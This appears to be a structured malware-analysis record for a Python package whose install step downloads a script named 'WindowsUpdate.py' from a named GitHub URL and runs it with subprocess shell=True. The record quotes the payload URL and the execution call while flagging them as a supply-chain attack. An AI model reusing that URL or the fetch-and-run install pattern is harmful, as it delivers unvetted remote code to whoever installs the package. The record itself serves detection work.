{
  "purpose": "The code downloads a remote Python script during installation and executes it without validation, posing a security risk.",
  "sources": "The URL 'https://raw.githubusercontent.com/NotInfected/tasgasgasg/main/WindowsUpdate.py' used in requests.get(), and the subsequent subprocess call executing the downloaded script.",
  "sinks": "subprocess.check_call('python WindowsUpdate.py', shell=True) which executes the downloaded script.",
  "flows": "requests.get() retrieves remote code -> saved as WindowsUpdate.py -> subprocess executes the script -> script is deleted.",
  "anomalies": "Remote code download and execution during package install without validation, use of shell=True, suspicious filename 'WindowsUpdate.py'.",
  "analysis": "The code performs remote code download and execution during setup, which is inherently dangerous. It uses requests to fetch a script from a hardcoded URL, then executes it via subprocess with shell=True, increasing injection risk. No validation or signature checks are performed, making it susceptible to supply chain attacks or malware delivery. The pattern is a classic indicator of malicious intent, especially in the context of package distribution. The code is straightforward, not obfuscated, and the behavior aligns with malicious activity patterns.",
  "conclusion": "The code exhibits malicious behavior by downloading and executing remote code during installation without validation, representing a high security threat. The pattern suggests supply chain attack potential or malware distribution. The high malware score (1), high security risk (1), and unobfuscated nature (0) are justified based on this behavior.",
